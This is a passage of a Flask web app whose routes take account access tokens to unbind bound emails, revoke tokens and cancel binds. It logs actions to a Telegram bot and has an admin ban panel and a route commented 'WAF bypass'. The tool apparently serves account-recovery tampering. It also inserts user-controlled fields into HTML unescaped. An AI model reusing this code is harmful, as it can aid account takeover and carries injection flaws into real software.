                send_to_telegram(f"🔓 UNBIND REQUEST (SEC)\nUser: {session.get('user_id')}")
            else:
                err = msg
        elif method == 'otp' and cur_email and otp:
            ok, msg = unbind_no_sec(access, cur_email, otp)
            if ok:
                success_msg = msg
                send_to_telegram(f"🔓 UNBIND REQUEST (OTP)\nUser: {session.get('user_id')}")
            else:
                err = msg
        else:
            err = "Please provide required fields for selected method!"
    
    return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Unbind</title>{CSS}</head><body><div style='width:100%;max-width:550px;padding:20px'><div class='card'><h1>UNBIND EMAIL</h1>{'<div class=error>'+err+'</div>' if err else ''}{'<div class=success>'+success_msg+'</div>' if success_msg else ''}<form method='POST' action='/unbind'><div class='input-group'><label>ACCESS TOKEN</label><input type='text' name='access_token' placeholder='Enter Access Token' required></div><div style='margin-bottom:15px'><label style='display:block;color:#ff000088;font-size:11px;margin-bottom:6px;text-transform:uppercase'>METHOD</label><select name='method' style='width:100%;padding:12px;background:rgba(255,0,0,0.04);border:1px solid #ff000033;border-radius:12px;color:#ff6666;font-size:14px' onchange='toggleMethod(this.value)'><option value='sec'>SECURITY CODE</option><option value='otp'>OTP METHOD</option></select></div><div id='secFields'><div class='input-group'><label>SECURITY CODE</label><input type='text' name='sec_code' placeholder='Enter Security Code'></div></div><div id='otpFields' style='display:none'><div class='input-group'><label>CURRENT EMAIL</label><input type='email' name='current_email' placeholder='Enter Current Bound Email'></div><div class='input-group'><label>OTP CODE</label><input type='text' name='otp' placeholder='Enter OTP'></div></div><button type='submit' class='btn'>UNBIND</button></form><a href='/dashboard' class='back-link'>← BACK TO DASHBOARD</a></div></div><script>function toggleMethod(v){{document.getElementById('secFields').style.display=v==='sec'?'block':'none';document.getElementById('otpFields').style.display=v==='otp'?'block':'none'}}</script></body></html>"""

# ============ Revoke ============
@app.route('/revoke', methods=['GET', 'POST'])
def revoke_route():
    if 'user_id' not in session:
        return redirect('/')
    err = ""
    success_msg = ""
    if request.method == 'POST':
        access = request.form.get('access_token')
        if not access:
            err = "Access Token required!"
        else:
            ok, msg = revoke_token(access)
            if ok:
                success_msg = msg
                send_to_telegram(f"🔑 TOKEN REVOKED\nUser: {session.get('user_id')}")
            else:
                err = msg
    return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Revoke</title>{CSS}</head><body><div style='width:100%;max-width:500px;padding:20px'><div class='card'><h1>REVOKE TOKEN</h1>{'<div class=error>'+err+'</div>' if err else ''}{'<div class=success>'+success_msg+'</div>' if success_msg else ''}<form method='POST' action='/revoke'><div class='input-group'><label>ACCESS TOKEN</label><input type='text' name='access_token' placeholder='Enter Access Token to Revoke' required></div><button type='submit' class='btn'>REVOKE</button></form><a href='/dashboard' class='back-link'>← BACK TO DASHBOARD</a></div></div></body></html>"""

# ============ Cancel Bind ============
@app.route('/cancel-bind', methods=['GET', 'POST'])
def cancel_bind_route():
    if 'user_id' not in session:
        return redirect('/')
    err = ""
    success_msg = ""
    if request.method == 'POST':
        access = request.form.get('access_token')
        if not access:
            err = "Access Token required!"
        else:
            ok, msg = cancel_bind(access)
            if ok:
                success_msg = msg
                send_to_telegram(f"❌ BIND CANCELLED\nUser: {session.get('user_id')}")
            else:
                err = msg
    return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Cancel Bind</title>{CSS}</head><body><div style='width:100%;max-width:500px;padding:20px'><div class='card'><h1>CANCEL BIND</h1>{'<div class=error>'+err+'</div>' if err else ''}{'<div class=success>'+success_msg+'</div>' if success_msg else ''}<form method='POST' action='/cancel-bind'><div class='input-group'><label>ACCESS TOKEN</label><input type='text' name='access_token' placeholder='Enter Access Token' required></div><button type='submit' class='btn'>CANCEL</button></form><a href='/dashboard' class='back-link'>← BACK TO DASHBOARD</a></div></div></body></html>"""

# ============ Admin ============
@app.route('/admin-login', methods=['GET', 'POST'])
def admin_login():
    err = ""
    if request.method == 'POST':
        if request.form.get('key') == ADMIN_KEY:
            session['admin'] = True
            return redirect('/admin')
        err = "INVALID ADMIN KEY!"
    return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Admin</title>{CSS}</head><body><div style='width:100%;max-width:450px;padding:20px'><div class='card'><h1>ADMIN PANEL</h1>{'<div class=error>'+err+'</div>' if err else ''}<form method='POST' action='/admin-login'><div class='input-group'><label>ADMIN KEY</label><input type='password' name='key' placeholder='ENTER ADMIN KEY' required></div><button type='submit' class='btn'>ACCESS</button></form><a href='/' class='back-link'>← HOME</a></div></div></body></html>"""

@app.route('/admin')
def admin():
    if not session.get('admin'):
        return redirect('/admin-login')
    users = User.query.order_by(User.display_id).all()
    banned_ips = BannedIP.query.all()
    banned_count = User.query.filter_by(is_banned=True).count()
    
    rows = ""
    for u in users:
        status = "ACTIVE" if not u.is_banned else "BANNED"
        sc = "color:#66ff66" if not u.is_banned else "color:#ff6666"
        btn = ""
        if u.is_banned:
            btn = f"<form method='POST' action='/admin/unban' style='display:inline'><input type='hidden' name='user_id' value='{u.id}'><button style='background:#33ff3355;border:none;padding:4px 12px;border-radius:6px;color:#66ff66;cursor:pointer'>UNBAN</button></form>"
        else:
            btn = f"<form method='POST' action='/admin/ban' style='display:inline'><input type='hidden' name='user_id' value='{u.id}'><button style='background:#ff333355;border:none;padding:4px 12px;border-radius:6px;color:#ff6666;cursor:pointer'>BAN</button></form><form method='POST' action='/admin/ban-ip' style='display:inline;margin-left:4px'><input type='hidden' name='ip' value='{u.ip}'><button style='background:#ff880055;border:none;padding:4px 12px;border-radius:6px;color:#ff8866;cursor:pointer'>IP BAN</button></form>"
        j = u.joined_at.strftime('%Y-%m-%d') if u.joined_at else '-'
        rows += f"<tr><td>{u.display_id}</td><td>{(u.username or '-')[:20]}</td><td>{u.ip or '-'}</td><td>{(u.device or '-')[:25]}</td><td>{j}</td><td><span style='{sc}'>{status}</span></td><td>{btn}</td></tr>"
    
    ip_rows = ""
    for b in banned_ips:
        ip_rows += f"<tr><td>{b.ip}</td><td>{b.banned_at.strftime('%Y-%m-%d %H:%M') if b.banned_at else '-'}</td><td><form method='POST' action='/admin/unban-ip'><input type='hidden' name='ip' value='{b.ip}'><button style='background:#33ff3355;border:none;padding:4px 12px;border-radius:6px;color:#66ff66;cursor:pointer'>UNBAN</button></form></td></tr>"
    
    return f"""<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Admin Panel</title><style>*{{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}}body{{background:#0a0a0a;color:#ff6666;padding:20px}}.navbar{{background:rgba(10,10,10,0.95);padding:15px 25px;display:flex;justify-content:space-between;border-bottom:1px solid #ff000033;margin-bottom:25px}}.navbar h1{{font-size:20px;color:#ff0000}}.navbar a{{color:#ff000088;text-decoration:none;padding:8px 16px;border:1px solid #ff000033;border-radius:8px}}.stats{{display:grid;grid-template-columns:repeat(3,1fr);gap:15px;margin-bottom:25px}}.stat-card{{background:rgba(255,0,0,0.03);border:1px solid #ff000022;border-radius:15px;padding:20px;text-align:center}}.stat-card h3{{color:#ff000088;font-size:11px;letter-spacing:1px}}.stat-card .value{{color:#ff0000;font-size:28px;font-weight:bold}}.section{{background:rgba(255,0,0,0.03);border-radius:15px;padding:20px;margin-bottom:20px;border:1px solid #ff000022;overflow-x:auto}}.section h2{{color:#ff0000;font-size:16px;margin-bottom:15px}}table{{width:100%;border-collapse:collapse;font-size:12px}}th,td{{padding:10px;text-align:left;border-bottom:1px solid #ff000011;color:#ff6666}}th{{color:#ff000088;letter-spacing:1px}}</style></head><body><div class='navbar'><h1>ADMIN PANEL</h1><a href='/logout'>LOGOUT</a></div><div class='stats'><div class='stat-card'><h3>TOTAL USERS</h3><div class='value'>{len(users)}</div></div><div class='stat-card'><h3>BANNED</h3><div class='value'>{banned_count}</div></div><div class='stat-card'><h3>BANNED IPS</h3><div class='value'>{len(banned_ips)}</div></div></div><div class='section'><h2>USERS</h2><table><tr><th>ID</th><th>USERNAME</th><th>IP</th><th>DEVICE</th><th>JOINED</th><th>STATUS</th><th>ACTION</th></tr>{rows}</table></div><div class='section'><h2>BANNED IPS</h2><table><tr><th>IP</th><th>BANNED AT</th><th>ACTION</th></tr>{ip_rows}</table></div></body></html>"""

@app.route('/admin/ban', methods=['POST'])
def admin_ban():
    if not session.get('admin'):
        return redirect('/admin-login')
    user = db.session.get(User, request.form.get('user_id'))
    if user:
        user.is_banned = True
        db.session.commit()
        send_to_telegram(f"🚫 USER BANNED\nID: {user.display_id}")
    return redirect('/admin')

@app.route('/admin/unban', methods=['POST'])
def admin_unban():
    if not session.get('admin'):
        return redirect('/admin-login')
    user = db.session.get(User, request.form.get('user_id'))
    if user:
        user.is_banned = False
        db.session.commit()
    return redirect('/admin')

@app.route('/admin/ban-ip', methods=['POST'])
def admin_ban_ip():
    if not session.get('admin'):
        return redirect('/admin-login')
    ip = request.form.get('ip')
    if ip and not is_ip_banned(ip):
        db.session.add(BannedIP(ip=ip))
        u = User.query.filter_by(ip=ip).first()
        if u:
            u.is_banned = True
        db.session.commit()
        send_to_telegram(f"🚫 IP BANNED\nIP: {ip}")
    return redirect('/admin')

@app.route('/admin/unban-ip', methods=['POST'])
def admin_unban_ip():
    if not session.get('admin'):
        return redirect('/admin-login')
    b = BannedIP.query.filter_by(ip=request.form.get('ip')).first()
    if b:
        db.session.delete(b)
        db.session.commit()
    return redirect('/admin')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/')

@app.route('/health')
def health():
    return "OK", 200

# WAF bypass
@app.route('/<path:path>')
def catch_all(path):
    if path.startswith('admin') or path in ['login', 'dashboard', 'check-bind', 'unbind', 'revoke', 'cancel-bind']:
        return redirect('/')
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False)
